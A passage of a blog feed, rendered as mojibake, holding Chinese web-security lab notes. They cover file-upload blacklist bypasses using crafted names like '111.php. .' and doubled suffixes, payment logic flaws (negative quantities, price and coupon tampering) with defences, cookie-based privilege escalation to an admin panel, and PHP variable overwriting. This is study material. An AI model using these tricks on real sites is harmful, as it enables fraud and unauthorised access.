src="https://m.qpic.cn/psb?/V133mrMy3dol57/.jYmXUYDdeLg0syadDStJOYrClaPTtwNCJ92IdU5zYs!/b/dLYAAAAAAAAA&amp;bo=fgfSA34H0gMRCT4!&amp;rf=viewer_4" alt></p><h2 id="9-æ„é€ æ–‡ä»¶åç¼€ç»•è¿‡"><a href="#9-æ„é€ æ–‡ä»¶åç¼€ç»•è¿‡" class="headerlink" title="9.æ„é€ æ–‡ä»¶åç¼€ç»•è¿‡"></a>9.æ„é€ æ–‡ä»¶åç¼€ç»•è¿‡</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/u0nPUSpkCll3GfBBIDmRopaaxgVdUrxPl0kX1o15lXo!/b/dMAAAAAAAAAA&amp;bo=awXNAmsFzQIRCT4!&amp;rf=viewer_4" alt><br>ç¬¬ä¹å…³å¥½åƒç”¨äº†æˆ‘ä»¬å‰é¢å…³å¡çš„æ‰€æœ‰è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å¯ä¸å¯ä»¥æ„é€ ä¸€ä¸ªæ–‡ä»¶ååç¼€111.php. . è¿‡æ»¤å‚æ•°åœ¨å‘ç°.æ—¶ä¼šå°†.å»æ‰ï¼Œåœ¨å°†ç©ºæ ¼å»æ‰ï¼Œæœ€ååªå‰©ä¸‹111.php. è¿™æ ·è¿˜æ˜¯å¯ä»¥ç»•è¿‡é»‘åå•æœºåˆ¶çš„ï¼Œå› ä¸º111.php.ä¸ç­‰äº111.phpï¼Œæ‰€ä»¥è¿˜æ˜¯èƒ½ç»•è¿‡ä¸Šä¼ ï¼›<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/b3gpzQ8zgA4BwI3BdF4*1rxQ4lONy3af9pXegTyO3Gg!/b/dLgAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="10åŒå†™æ–‡ä»¶åç¼€ç»•è¿‡"><a href="#10åŒå†™æ–‡ä»¶åç¼€ç»•è¿‡" class="headerlink" title="10åŒå†™æ–‡ä»¶åç¼€ç»•è¿‡"></a>10åŒå†™æ–‡ä»¶åç¼€ç»•è¿‡</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ypZhRcfDvAhSB.SfJLlAWG2DK8tmHOECM2ZWrfGyWtU!/b/dIQAAAAAAAAA&amp;bo=agUEAmoFBAIRCT4!&amp;rf=viewer_4" alt></p><p>ä¼šå°†ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶åç¼€åˆ é™¤ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ–‡ä»¶åç¼€è¿›è¡ŒåŒå†™ï¼Œä»¤ä»–åˆ é™¤ååˆå¹¶å°±èƒ½æˆåŠŸç»•è¿‡ï¼</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/4OigHcJUMtz6dSWTiGju0oMns0AxY1eM0u*O.o.QG7E!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/LG5JK1ZorQZBrglBO1UAbGKez.B5lgA3DPErpWLP77M!/b/dDcBAAAAAAAA&amp;bo=cgfWA3IH1gMRCT4!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ”¯ä»˜æ¼æ´</title>
      <link href="/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="å¿«æ·æ”¯ä»˜åŸç†"><a href="#å¿«æ·æ”¯ä»˜åŸç†" class="headerlink" title="å¿«æ·æ”¯ä»˜åŸç†"></a>å¿«æ·æ”¯ä»˜åŸç†</h2><p>å•†æˆ·ç½‘ç«™æ¥å…¥æ”¯ä»˜ç»“æœæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æµè§ˆå™¨è¿›è¡Œè·³è½¬é€šçŸ¥ï¼Œä¸€ç§æ˜¯æœåŠ¡å™¨ç«¯å¼‚æ­¥é€šçŸ¥</p><h3 id="æµè§ˆå™¨è·³è½¬"><a href="#æµè§ˆå™¨è·³è½¬" class="headerlink" title="æµè§ˆå™¨è·³è½¬"></a>æµè§ˆå™¨è·³è½¬</h3><p>åŸºäºç”¨æˆ·è®¿é—®çš„æµè§ˆå™¨ï¼Œå¦‚æœç”¨æˆ·åœ¨é“¶è¡Œé¡µé¢æ”¯ä»˜æˆåŠŸåï¼Œç›´æ¥å…³é—­äº†é¡µé¢ï¼Œå¹¶æœªç­‰å¾…é“¶è¡Œè·³è½¬åˆ°æ”¯ä»˜ç»“æœé¡µé¢ï¼Œé‚£ä¹ˆå•†æˆ·ç½‘ç«™å°±æ”¶ä¸åˆ°æ”¯ä»˜ç»“æœçš„é€šçŸ¥ï¼Œå¯¼è‡´æ”¯ä»˜ç»“æœéš¾ä»¥å¤„ç†ã€‚è€Œä¸”æµè§ˆå™¨ç«¯æ•°æ®å¾ˆå®¹æ˜“è¢«ç¯¡æ”¹è€Œé™ä½å®‰å…¨æ€§</p><h3 id="æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥"><a href="#æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥" class="headerlink" title="æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥"></a>æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥</h3><p>è¯¥æ–¹å¼æ˜¯æ”¯ä»˜å…¬å¸æœåŠ¡å™¨åå°ç›´æ¥å‘ç”¨æˆ·æŒ‡å®šçš„å¼‚æ­¥é€šçŸ¥URLå‘é€å‚æ•°ï¼Œé‡‡ç”¨postæˆ–getçš„æ–¹å¼ã€‚å•†æˆ·ç½‘ç«™æ¥å—å¼‚æ­¥å‚æ•°çš„URLå¯¹åº”çš„ç¨‹åºä¸­ï¼Œè¦å¯¹æ”¯ä»˜å…¬å¸è¿”å›çš„æ”¯ä»˜ç»“æœè¿›è¡Œç­¾åéªŒè¯ï¼ŒæˆåŠŸåè¿›è¡Œæ”¯ä»˜é€»è¾‘å¤„ç†ï¼Œå¦‚éªŒè¯é‡‘é¢ï¼Œè®¢å•ä¿¡æ¯æ˜¯å¦ä¸å‘èµ·æ”¯ä»˜æ—¶ä¸€è‡´ï¼ŒéªŒè¯æ­£å¸¸åˆ™å¯¹å®šå•è¿›è¡ŒçŠ¶æ€å¤„ç†æˆ–ä¸ºç”¨æˆ·è¿›è¡Œç½‘ç«™å†…å…¥è´¦ç­‰ã€‚</p><p>è¯¥æ¼æ´å±äºé€»è¾‘æ¼æ´çš„ä¸€ç§ï¼Œéœ€è¦é ä¸ä¸€æ ·çš„æ€ç»´ï¼Œæ¥è¿›è¡Œé€»è¾‘ç»•è¿‡ã€‚</p><p>##å¸¸è§æ”¯ä»˜æ¼æ´<br>æ”¯ä»˜æ­¥éª¤ï¼šâ€”â€”â€”â€”è®¢è´­ã€è®¢å•ã€ä»˜æ¬¾</p><p>ä¸‰ä¸ªæ­¥éª¤å½“ä¸­çš„éšä¾¿ä¸€ä¸ªæ­¥éª¤è¿›è¡Œä¿®æ”¹ä»·æ ¼æµ‹è¯•ï¼Œå¦‚æœå‰é¢ä¸¤æ­¥æœ‰éªŒè¯æœºåˆ¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨æœ€åä¸€æ­¥å¯ŒçŸ¿çŸ³è¿›è¡ŒæŠ“åŒ…å°è¯•ä¿®æ”¹é‡‘é¢ï¼Œå¦‚æœæ²¡æœ‰åœ¨æœ€åä¸€æ­¥åšå¥½æ£€éªŒï¼Œé‚£ä¹ˆé—®é¢˜å°±ä¼šå­˜åœ¨ï¼Œå…¶ä¿®æ”¹çš„é‡‘é¢å€¼ä½ å¯ä»¥å°è¯•å°æ•°ç›®æˆ–è€…å°è¯•è´Ÿæ•°ã€‚</p><ul><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0112258.html" target="_blank" rel="noopener">ä¿®æ”¹æ”¯ä»˜é‡‘é¢æ¡ˆä¾‹</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">ä¿®æ”¹æ”¯ä»˜çŠ¶æ€æ¡ˆä¾‹</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0108134.html" target="_blank" rel="noopener">ä¿®æ”¹è®¢å•æ•°é‡æ¡ˆä¾‹</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0139556.html" target="_blank" rel="noopener">ä¿®æ”¹é™„å±å€¼æ¡ˆä¾‹</a></p></li></ul><p>ä¼˜æƒ åˆ¸å…¶åŸºæœ¬éƒ½æ˜¯ä¼˜æƒ ä¸€åŠï¼Œä¸€èˆ¬ç”¨ä¼˜æƒ åˆ¸è¿›è¡Œæ¶ˆè´¹ä¸€èˆ¬å‡ºç°åœ¨ç¬¬äºŒä¸ªæ­¥éª¤å½“ä¸­ï¼šç¡®è®¤è´­ä¹°ä¿¡æ¯ï¼Œåœ¨è¿™ä¸ªæ­¥éª¤é¡µé¢å½“ä¸­ï¼Œä½ å¯ä»¥é€‰æ‹©ç›¸å…³ä¼˜æƒ åŠµï¼Œç„¶åç›´æ¥ä¿®æ”¹é‡‘é¢å¤§äºæˆ–ç­‰äºå•†å“ä»·æ ¼å°±å¯ä»¥ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹å…¶ä¸ºè´Ÿå€¼è¿›è¡Œå°è¯•ï¼Œæœ€åè¿›è¡Œæ”¯ä»˜ï¼Œå¦‚æœå¯¹è¿™ç‚¹æ²¡æœ‰åŠ ä»¥éªŒè¯ï¼Œé‚£ä¹ˆé—®é¢˜å°±ä¼šäº§ç”Ÿï¼Œç›´æ¥æ”¯ä»˜æˆåŠŸ</p><p>è¶Šæƒæ”¯ä»˜<br>å­˜åœ¨user=id(123)ï¼Œè¿™ç§ä¼ å‚æ—¶ï¼Œå°è¯•æ”¹idï¼Œå°è¯•ç”¨åˆ«äººçš„é’±åŒ…ä¹°è‡ªå·±çš„ç‰©å“</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0188155.html" target="_blank" rel="noopener">æ— é™åˆ¶è¯•ç”¨æ¡ˆä¾‹</a><br>æ¯”å¦‚è¯•ç”¨çš„å‚æ•°ä¸º2ï¼Œæ­£å¸¸è´­ä¹°çš„å‚æ•°ä¸º1<br>é‚£ä¹ˆæˆ‘ä»¬è´­ä¹°å‚æ•°ä¸º2(è¯•ç”¨)ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ</p><h2 id="æ”¯ä»˜æ¼æ´-æŒ–æ˜"><a href="#æ”¯ä»˜æ¼æ´-æŒ–æ˜" class="headerlink" title="æ”¯ä»˜æ¼æ´(æŒ–æ˜)"></a>æ”¯ä»˜æ¼æ´(æŒ–æ˜)</h2><ul><li><strong>æ‰¾åˆ°å…³é”®çš„æ•°æ®åŒ…</strong><br>å¯èƒ½æ”¯ä»˜æ“ä½œæœ‰ä¸‰å››ä¸ªæ•°æ®åŒ…ï¼Œæˆ‘ä»¬è¦å¯¹æ•°æ®è¿›è¡ŒæŒ‘é€‰ã€‚</li><li><strong>åˆ†ææ•°æ®åŒ…</strong><br>æ”¯ä»˜æ•°æ®åŒ…ä¸­ä¼šåŒ…å«å¾ˆå¤šçš„æ•æ„Ÿä¿¡æ¯(è´¦å·ï¼Œé‡‘é¢ï¼Œä½™é¢ï¼Œä¼˜æƒ )ï¼Œè¦æ“¦å°è¯•å¯¹æ•°æ®åŒ…ä¸­çš„å„ä¸ªå‚æ•°è¿›è¡Œåˆ†æ</li><li><strong>ä¸æŒ‰å¥—è·¯å‡ºç‰Œ</strong><br>å¤šå»æƒ³æƒ³å¼€å‘æƒ³ä¸åˆ°çš„åœ°æ–¹<br>pcç«¯å°è¯•è¿‡ï¼Œwapç«¯ä¹Ÿçœ‹çœ‹ï¼Œappä¹Ÿè¯•è¯•</li></ul><h2 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h2><p>1ã€åç«¯æ£€æŸ¥æ¯ä¸€é¡¹å€¼ï¼ŒåŒ…æ‹¬æ”¯ä»˜çŠ¶æ€ã€‚</p><p>2ã€æ ¡éªŒä»·æ ¼ã€æ•°é‡å‚æ•°ï¼Œæ¯”å¦‚äº§å“æ•°é‡åªèƒ½ä¸ºæ•´æ•°ï¼Œå¹¶é™åˆ¶è´­ä¹°æ•°é‡</p><p>3ã€ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ£€æŸ¥ï¼Œå®é™…æ”¯ä»˜çš„é‡‘é¢æ˜¯å¦ä¸è®¢å•ä¸€è‡´ã€‚</p><p>4ã€å¯¹æ”¯ä»˜å‚æ•°è¿›è¡ŒMD5åŠ å¯†ã€è§£å¯†ã€æ•°å­—ç­¾ååŠéªŒè¯ï¼Œè¿™ä¸ªå¯ä»¥æœ‰æ•ˆçš„é¿å…æ•°æ®ä¿®æ”¹ï¼Œé‡æ”¾æ”»å‡»ä¸­çš„å„ç§é—®é¢˜</p><p>5ã€é‡‘é¢è¶…è¿‡ä¸€å®šå€¼ï¼Œè¿›è¡Œäººå·¥å®¡æ ¸</p><p>6ã€é™åˆ¶ç”¨æˆ·å¯¹å•†å“çš„æ”¯ä»˜æ¬¡æ•°</p><h2 id="é¶åœºå®è·µ"><a href="#é¶åœºå®è·µ" class="headerlink" title="é¶åœºå®è·µ"></a>é¶åœºå®è·µ</h2><p>æ‰¾åˆ°äº†ä¸€ä¸ªå¾ˆè¾£çœ¼ç›çš„CMS<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujelhkej31h90p8gud.jpg" alt><br>æˆ‘ä»¬å…ˆè¿›è¡Œæ³¨å†Œç”¨æˆ·<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujv998nj31h90ilwkt.jpg" alt><br>æˆ‘ä»¬ç‚¹å‡»å•†å“ä¸­å¿ƒ<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uuk97z1bj31hc0oa10b.jpg" alt><br>å‘ç°ä»–çš„è´­ä¹°æ•°é‡æ²¡è¿›è¡Œé™åˆ¶ï¼Œè¿˜å¯ä»¥å¡«å…¥è´Ÿæ•°ï¼Œè¿™å°±è¿ä¼ åŒ…çš„åŠ›æ°”éƒ½çœâ€¦ é‚£æˆ‘ä»¬å¡«å…¥-10000è¯•è¯•<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uukm40dfj31ha0o9qa7.jpg" alt><br>æäº¤<br> å‘ç°æŠ¥é”™<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uullzk2dj31gt0q0q5j.jpg" alt><br>æˆ‘ä»¬å…ˆä¸ç®¡ï¼Œå…ˆè¿”å›çœ‹çœ‹<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uul2tmojj31hc0nuq9d.jpg" alt><br>æˆ‘ä»¬å‘ç°æˆ‘è´¦æˆ·ä½™é¢å¤šäº†92000å—</p><hr><p>æˆ‘æœåˆ°ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘è§‰å¾—æ€»ç»“çš„æŒºå¥½çš„ï¼Œæ¨èä¸€ä¸‹ï¼š<a href="https://secpulse.com/archives/67080.html" target="_blank" rel="noopener">æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¹³è¡Œè¶Šæƒã€å‚ç›´è¶Šæƒ</title>
      <link href="/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="è¶Šæƒæ¼æ´æè¿°"><a href="#è¶Šæƒæ¼æ´æè¿°" class="headerlink" title="è¶Šæƒæ¼æ´æè¿°"></a>è¶Šæƒæ¼æ´æè¿°</h2><p>è¶Šæƒè®¿é—®ï¼Œè¿™ç±»æ¼æ´æ˜¯æŒ‡åº”ç”¨åœ¨æ£€æŸ¥æˆæƒ(Authorization)æ—¶å­˜åœ¨çº°æ¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨è·å¾—ä½æƒé™ç”¨æˆ·å¸ååï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›æ–¹å¼ç»•è¿‡æƒé™æ£€æŸ¥ï¼Œè®¿é—®æˆ–è€…æ“ä½œåˆ°åŸæœ¬æ— æƒè®¿é—®çš„é«˜æƒé™åŠŸèƒ½ã€‚åœ¨å®é™…çš„ä»£ç å®‰å…¨å®¡æŸ¥ä¸­ï¼Œè¿™ç±»æ¼æ´å¾€å¾€å¾ˆéš¾é€šè¿‡å·¥å…·è¿›è¡Œè‡ªåŠ¨åŒ–æ£€æµ‹ï¼Œå› æ­¤åœ¨å®é™…åº”ç”¨ä¸­å±å®³å¾ˆå¤§ã€‚å…¶ä¸æœªæˆæƒè®¿é—®æœ‰ä¸€å®šå·®åˆ«ã€‚ç›®å‰å­˜åœ¨ç€ä¸¤ç§è¶Šæƒæ“ä½œç±»å‹ï¼šæ¨ªå‘è¶Šæƒæ“ä½œ(å¹³è¡Œè¶Šæƒ)å’Œçºµå‘è¶Šæƒæ“ä½œ(å‚ç›´è¶Šæƒ)ã€‚</p><ul><li><strong>æ°´å¹³è¶Šæƒæ¼æ´</strong>ï¼Œæ˜¯ä¸€ç§â€œåŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶â€è®¾è®¡ç¼ºé™·å¼•èµ·çš„æ¼æ´ã€‚ç”±äºæœåŠ¡å™¨ç«¯åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ•°æ®è¿›è¡Œæ“ä½œæ—¶æ²¡æœ‰åˆ¤æ–­æ•°æ®çš„æ‰€å±äººè€Œå¯¼è‡´çš„è¶Šæƒæ•°æ®è®¿é—®æ¼æ´ã€‚å¦‚æœåŠ¡å™¨ç«¯ä»å®¢æˆ·ç«¯æäº¤çš„requestå‚æ•°(ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„æ•°æ®)ä¸­è·å–ç”¨æˆ·idï¼Œæ¶æ„æ”»å‡»è€…é€šè¿‡å˜æ¢è¯·æ±‚IDçš„å€¼ï¼ŒæŸ¥çœ‹æˆ–ä¿®æ”¹ä¸å±äºæœ¬äººçš„æ•°æ®ã€‚</li><li><strong>å‚ç›´è¶Šæƒæ¼æ´</strong>ï¼Œä¹Ÿç§°ä¸ºæƒé™æå‡ï¼Œæ˜¯ä¸€ç§â€œåŸºäºURLçš„è®¿é—®æ§åˆ¶â€è®¾è®¡ç¼ºé™·å¼•èµ·çš„æ¼æ´ã€‚ç”±äºWebåº”ç”¨ç¨‹åºæ²¡æœ‰åšæƒé™æ§åˆ¶æˆ–è€…ä»…åœ¨èœå•ä¸Šåšäº†æƒé™æ§åˆ¶ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·åªè¦çŒœæµ‹å…¶ä»–ç®¡ç†é¡µé¢çš„URLï¼Œå°±å¯ä»¥è®¿é—®æˆ–æ§åˆ¶å…¶ä»–è§’è‰²æ‹¥æœ‰çš„æ•°æ®æˆ–é¡µé¢ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn5h46bnj30ty0fggno.jpg" alt></li></ul><p>æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆè¯´<strong>æŠŠæ¡ä½ä¼ å‚å°±èƒ½æŠŠæ¡ä½é€»è¾‘æ¼æ´çš„å‘½è„‰</strong>ï¼Œå…¶å®æ¸—é€æµ‹è¯•ä¹Ÿæ˜¯åŒä¸€é“ç†ï¼Œæ¼æ´æ˜¯ä¸ä¼šæ— ç¼˜æ— æ•…äº§ç”Ÿã€‚</p><h3 id="è¶Šæƒæ€è·¯"><a href="#è¶Šæƒæ€è·¯" class="headerlink" title="è¶Šæƒæ€è·¯"></a>è¶Šæƒæ€è·¯</h3><p>ç™»å…¥ç”¨æˆ·Aï¼Œæ­£å¸¸æ›´æ”¹æˆ–è€…æ˜¯æŸ¥çœ‹Aç”¨æˆ·ä¿¡æ¯ï¼Œç„¶åæŠ“å–æ•°æ®åŒ…ï¼Œå°†ä¼ å‚IDä¿®æ”¹ä¸ºå…¶ä»–ç”¨æˆ·ï¼Œå¦‚æœæˆåŠŸæŸ¥çœ‹æˆ–è€…ä¿®æ”¹äº†åŒæƒé™å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯å°±å±äºæ°´å¹³è¶Šæƒæµ‹è¯•(å½“ç„¶å¦‚æœå¯ä»¥å½±å“åˆ°æ›´é«˜æƒé™çš„ç”¨æˆ·å°±æ˜¯å‚ç›´è¶Šæƒæ¼æ´)</p><p>ä¼ å‚IDå‚æ•°éœ€è¦è‡ªå·±æ£€æµ‹(å¸¸è§ï¼šuid= id= user= ç­‰)é€šå¸¸ä½¿ç”¨brupè¿›è¡Œçˆ†ç ´ä¼ å‚(ä¼ å‚å¯èƒ½åœ¨GET POST COOKIEä¸­)</p><p>å¸¸è§çš„å¹³è¡Œè¶Šæƒ(ä¸éœ€è¦è¾“å…¥åŸå¯†ç çš„ä¿®æ”¹å¯†ç ï¼ŒæŠ“åŒ…è¯¥æ”¹ç”¨æˆ·æˆ–è€…ç”¨æˆ·IDä¿®æ”¹ä»–äººå¯†ç )è¿›è¡ŒæŸ¥çœ‹è®¢å•ä¿¡æ¯ï¼Œéå†è®¢å•idç­‰ã€‚</p><h3 id="è¶Šæƒæ¼æ´å®ä¾‹ä¸ç±»å‹"><a href="#è¶Šæƒæ¼æ´å®ä¾‹ä¸ç±»å‹" class="headerlink" title="è¶Šæƒæ¼æ´å®ä¾‹ä¸ç±»å‹"></a>è¶Šæƒæ¼æ´å®ä¾‹ä¸ç±»å‹</h3><ol><li>é€šè¿‡ä¿®æ”¹GETä¼ å‚æ¥è¶Šæƒ<a href="http://www.anquan.us/static/bugs/wooyun-2016-0205340.html" target="_blank" rel="noopener">GETè¶Šæƒå®ä¾‹</a></li><li>ä¿®æ”¹POSTä¼ å‚è¿›è¡Œè¶Šæƒ<a href="http://www.anquan.us/static/bugs/wooyun-2016-0207583.html" target="_blank" rel="noopener">POSTè¶Šæƒå®ä¾‹</a></li><li>ä¿®æ”¹cookieä¼ å‚è¿›è¡Œè¶Šæƒ<a href="http://www.anquan.us/static/bugs/wooyun-2016-0184633.html" target="_blank" rel="noopener">COOKIEè¶Šæƒå®ä¾‹</a></li></ol><p>è¿˜æœ‰ä¸€ç±»å«åš<strong>æœªæˆæƒè®¿é—®</strong>ï¼Œä¸¥æ ¼æ„ä¹‰ä¸Šè€Œè¨€è¿™ä¸ªä¸å±äºè¶Šæƒæ¼æ´ï¼Œä½†æ˜¯åœ¨æ—¥å¸¸çš„æµ‹è¯•ä¸­å¸¸å¸¸ä¼šé‡è§</p><p>(åªè¦<strong>è¾“å…¥æ­£ç¡®å¯¹åº”èº«ä»½çš„ç½‘å€å°±å¯ä»¥ç›´æ¥è®¿é—®</strong>ï¼Œä¾‹å¦‚/adminé»˜è®¤æ˜¯ç™»å½•ï¼Œç™»é™†åè·³è½¬åˆ°user.phpç„¶åç›´æ¥è®¿é—®user.phpï¼Œå‘ç°ä½ ç›´æ¥æœ‰åå°æƒé™)</p><h2 id="é¶åœºå®é™…"><a href="#é¶åœºå®é™…" class="headerlink" title="é¶åœºå®é™…"></a>é¶åœºå®é™…</h2><p>é¶åœºæ˜¯ä¸€ä¸ªå¾ˆè€çš„ä¿ä¿®ç³»ç»Ÿï¼Œè™½ç„¶å¾ˆè€ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›ç½‘ç«™è¿˜åœ¨ä½¿ç”¨(BWSsoftç»´ä¿®ç³»ç»Ÿ)<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn66xuz7j31h80pydo1.jpg" alt="2"><br>æˆ‘ä»¬æƒ³è¦å»åšä¸€ä¸ªè¶Šæƒï¼Œé‚£æˆ‘ä»¬éœ€è¦å…ˆæœ‰ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„ä½¿ç”¨æƒé™ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æ³¨å†ŒæŒ‰é’®ï¼Œäºæ˜¯æˆ‘ä»¬è¿›è¡Œäº†æ³¨å†Œï¼Œè·å¾—äº†ä¸€ä¸ªæ™®é€šç”¨æˆ·èº«ä»½ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn6kpdp3j31hc0p2dnr.jpg" alt="3"><br>æˆ‘ä»¬ç‚¹å‡»ç‰©å“ä¿ä¿®ï¼Œå¹¶æŠ“ä¸ªåŒ…çœ‹çœ‹ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3snle4qokj30z40rkabo.jpg" alt="4"><br>æˆ‘ä»¬å‘ç°cookieä¸­å­˜åœ¨ç™»é™†ç”¨æˆ·çš„ä¿¡æ¯ä¼ å‚ï¼Œé‚£æˆ‘ä»¬æ˜¯å¦èƒ½å¯¹å…¶æ•°æ®æ›´æ”¹è¿›è¡Œè¶Šæƒ<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7bm6blj31a00mt0vp.jpg" alt="5"><br>æˆ‘ä»¬çœ‹åˆ°admin=0ï¼Œé‚£ç®¡ç†å‘˜çš„adminä¼ å‚æ˜¯ä¸æ˜¯è¦ç­‰äº1å‘¢ï¼Œæˆ‘æ”¹äº†ä¸€ä¸‹ï¼Œä½†æ˜¯æ²¡ç”¨ï¼Œåé¢æˆ‘çœ‹åˆ°äº†ä¸€ä¸ªshenfençš„ä¼ å‚ï¼Œä¸¤ä¸ªä¸€èµ·ä¿®æ”¹æ‰æœ‰æ•ˆå‘¢ï¼Œç®¡ç†å‘˜çš„å‚æ•°å€¼ä¸€èˆ¬ä¸º1(true)ï¼Œé‚£æˆ‘ä»¬è¯•ä¸€ä¸‹ã€‚<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7p34boj30v80oswhs.jpg" alt="6"><br>å‘ç°æ”¹å®Œä»¥åå‡ºç°äº†åå°ç®¡ç†çš„æŒ‰é’®<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn84pl6pj31hc0q2wmh.jpg" alt="7"><br>æˆ‘ä»¬ç‚¹å‡»è¿›å»<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn8f7fi1j31hc0hltak.jpg" alt="8"><br>å‘ç°æˆåŠŸè¿›å»åå°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å˜é‡è¦†ç›–</title>
      <link href="/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="å˜é‡è¦†ç›–ä»‹ç»"><a href="#å˜é‡è¦†ç›–ä»‹ç»" class="headerlink" title="å˜é‡è¦†ç›–ä»‹ç»"></a>å˜é‡è¦†ç›–ä»‹ç»</h2><p>å˜é‡è¦†ç›–æŒ‡çš„æ˜¯ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢ç¨‹åºåŸæœ‰çš„å˜é‡å€¼ï¼Œä¸€èˆ¬å˜é‡è¦†ç›–æ¼æ´éœ€è¦ç»“åˆç¨‹åºçš„å…¶å®ƒåŠŸèƒ½æ¥å®ç°å®Œæ•´çš„æ”»å‡»ï¼›å˜é‡è¦†ç›–æ¼æ´æœ‰æ—¶å€™å¯ä»¥ç›´æ¥è®©æˆ‘ä»¬è·å–Webshellï¼Œæ‹¿åˆ°æœåŠ¡å™¨æƒé™ï¼› </p><p>ç»å¸¸å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´åœºæ™¯æœ‰ï¼š<strong>$$ï¼Œextract()å‡½æ•°ï¼Œparse_str()å‡½æ•°ï¼Œimport_request_variables()ä½¿ç”¨ä¸å½“ï¼Œå¼€å¯äº†å…¨å±€å˜é‡æ³¨å†Œç­‰ã€‚</strong></p><h2 id="å˜é‡è¦†ç›–å‡½æ•°è§£æ"><a href="#å˜é‡è¦†ç›–å‡½æ•°è§£æ" class="headerlink" title="å˜é‡è¦†ç›–å‡½æ•°è§£æ"></a>å˜é‡è¦†ç›–å‡½æ•°è§£æ</h2><h3 id="extract-å˜é‡è¦†ç›–"><a href="#extract-å˜é‡è¦†ç›–" class="headerlink" title="extract()å˜é‡è¦†ç›–"></a>extract()å˜é‡è¦†ç›–</h3><p>extract() 